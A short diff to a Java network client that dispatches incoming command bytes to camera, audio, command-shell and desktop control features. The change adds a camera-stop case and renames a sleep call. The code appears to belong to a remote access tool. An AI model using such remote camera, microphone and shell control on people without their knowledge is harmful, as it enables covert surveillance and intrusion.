@@ -107,6 +107,7 @@ public class Client extends NetworkInterface {
                             cameraCapture.open();
                             cameraCapture.startFeature();
                         }
+                        case CommandByte.CAMERA_BYTE_STOP -> cameraCapture.stopFeature();
                         case CommandByte.AUDIOCAPTURE_BYTE -> audioCapture.startFeature();
                         case CommandByte.CMDCONTROL_BYTE -> cmdControl.startFeature();
                         case CommandByte.DESKTOPCONTROL_BYTE -> desktopCapture.startFeature();
@@ -118,7 +119,7 @@ public class Client extends NetworkInterface {
                 } catch (IOException e) {
                     e.printStackTrace();
                 }
-                sleep(1000 / 60);
+                Sleep(1000 / 60);
             }
         };
     }
